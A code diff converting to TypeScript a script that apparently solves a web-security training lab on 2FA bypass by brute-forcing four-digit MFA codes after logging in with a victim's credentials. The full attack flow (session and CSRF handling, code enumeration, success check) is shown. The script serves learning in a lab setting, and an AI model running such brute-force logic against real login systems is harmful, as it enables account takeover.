@@ -4,6 +4,8 @@ import { runTasks } from "../../../utils/runTasks.js";
 import { sleep } from "../../../utils/sleep.js";
 import { extractCsrfToken } from "../../../utils/extractCsrfToken.js";
 import { extractCookie } from "../../../utils/extractCookie.js";
+import { Cookie } from "../../../utils/Cookie.js";
+import { AxiosResponse } from "axios";
 
 const { labUrl, concurrencyLimit, httpClient } = getParsedInputFromUser({
   description: "Lab: 2FA bypass using a brute-force attack",
@@ -43,7 +45,7 @@ function getTasks() {
   return tasks;
 }
 
-async function task(index) {
+async function task(index: number) {
   let [sessionCookie, csrfToken] = await getFromLogin();
   sessionCookie = await postToLogin(sessionCookie, csrfToken);
   csrfToken = await getFromLogin2(sessionCookie);
@@ -69,44 +71,53 @@ async function task(index) {
   console.log(`${mfaCode}: fail`);
 }
 
-async function getFromLogin() {
-  let response = await httpClient.get(labUrl + "login");
+async function getFromLogin(): Promise<[Cookie, string]> {
+  const response = await httpClient.get(labUrl + "login");
   return [extractCookie(response, "session"), extractCsrfToken(response.data)];
 }
 
-async function postToLogin(sessionCookie, csrfToken) {
+async function postToLogin(sessionCookie: Cookie, csrfToken: string) {
   const victimsCredentials = { username: "carlos", password: "montoya" };
   const data = new URLSearchParams({ csrf: csrfToken, ...victimsCredentials });
   const response = await httpClient.post(labUrl + "login", data, {
     headers: {
-      cookie: sessionCookie,
+      cookie: sessionCookie.toString(),
     },
   });
   return extractCookie(response, "session");
 }
 
-async function getFromLogin2(sessionCookie) {
+async function getFromLogin2(sessionCookie: Cookie) {
   const response = await httpClient.get(labUrl + "login2", {
     headers: {
-      cookie: sessionCookie,
+      cookie: sessionCookie.toString(),
     },
   });
   return extractCsrfToken(response.data);
 }
 
-async function postToLogin2({ sessionCookie, csrfToken, mfaCode }) {
+async function postToLogin2({
+  sessionCookie,
+  csrfToken,
+  mfaCode,
+}: {
+  sessionCookie: Cookie;
+  csrfToken: string;
+  mfaCode: string;
+}) {
   const data = new URLSearchParams({ csrf: csrfToken, "mfa-code": mfaCode });
   return await httpClient.post(labUrl + "login2", data, {
     headers: {
-      cookie: sessionCookie,
+      cookie: sessionCookie.toString(),
     },
   });
 }
 
-function getMfaCode(index) {
+function getMfaCode(index: number) {
   return index.toString().padStart(4, "0");
 }
 
-function isResponseSuccess(response) {
+// TODO: maybe parameter should be statusCode
+function isResponseSuccess(response: AxiosResponse) {
   return response.status === 302;
 }
